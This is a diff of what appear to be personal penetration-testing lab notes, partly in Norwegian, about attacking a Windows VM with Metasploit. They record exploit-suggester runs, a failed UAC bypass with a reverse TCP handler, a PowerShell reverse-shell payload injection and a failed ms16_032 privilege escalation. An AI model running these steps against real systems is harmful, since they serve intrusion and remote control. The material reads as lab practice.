@@ -59,7 +59,7 @@ net users
 
     **
 
-use post/multi/recon/local\_exploit\_suggester **  
+use post/multi/recon/local\_exploit\_suggester **    
 **FORSØKT ALLE DISSE UTEN HELL\*\*
 
 ```
@@ -105,8 +105,8 @@ msf post\(enum\_patches\) &gt; set session 2
 session =&gt; 2  
 msf post\(enum\_patches\) &gt; exploit
 
-\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass  
-[-] Call stack:  
+\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass    
+[-] Call stack:    
 [-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in`run'  
 \[\*\] Post module execution completed
 
@@ -437,21 +437,19 @@ ALG                             NT AUTHORITY\LocalService    Manual    C:\Window
 **forsøkte å bypasse uac**  
 msf exploit\(bypassuac\) &gt; exploit
 
-\[_\] Started reverse TCP handler on 10.0.0.8:4444   
+\[_\] Started reverse TCP handler on 10.0.0.8:4444  
 \[_\] UAC is Enabled, checking level...  
 \[+\] UAC is set to Default  
 \[+\] BypassUAC can bypass this setting, continuing...  
 \[-\] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
-
-
-
-
 
 **greide å få powershell**
 
 ```
 use exploit/windows/local/payload_inject
 set payload windows/powershell_reverse_tcp
+
+exploit/windows/local/ms16_032_secondary_logon_handle_privesc funekr ikke fordi det bare er et ettkjerne vm. krever to kjerner
 ```
 
 ```
